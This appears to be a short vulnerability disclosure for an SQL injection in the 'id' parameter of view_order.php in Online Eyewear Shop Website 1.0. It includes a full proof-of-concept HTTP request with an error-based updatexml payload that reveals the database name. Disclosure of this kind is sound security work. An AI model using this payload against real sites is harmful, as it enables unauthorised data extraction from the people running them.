## Online Eyewear Shop Website has a front-end SQL injection vulnerability

## Affected version: 
Online Eyewear Shop Website - 1.0

## Software:
https://www.sourcecodester.com/php/16089/online-eyewear-shop-website-using-php-and-mysql-free-download.html

## Vulnerability File:
/oews/orders/view_order.php

## Description:
Online Eyewear Shop Website1.0 has a SQL injection attack in /oews/orders/view_order.php, and the attack parameter is id. Attackers can exploit this vulnerability to directly obtain sensitive information from the server.

Status: CRITICAL

POC
```
GET /oews/orders/view_order.php?id=1%27%20and%20updatexml(1,concat(0x7e,(database())),3)--%20q HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=hja6qtrb9s45kr3hinceav416b
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
```

Get the database name directly through the error report: oews_db

![CleanShot 2025-01-01 at 21 25 01@2x](https://github.com/user-attachments/assets/260983d3-dcc9-4ef9-b342-489fca10c4f9)


## Code Analysis

![CleanShot 2025-01-01 at 21 26 02@2x](https://github.com/user-attachments/assets/f8121f08-59ec-46bd-8e5d-a72132145953)


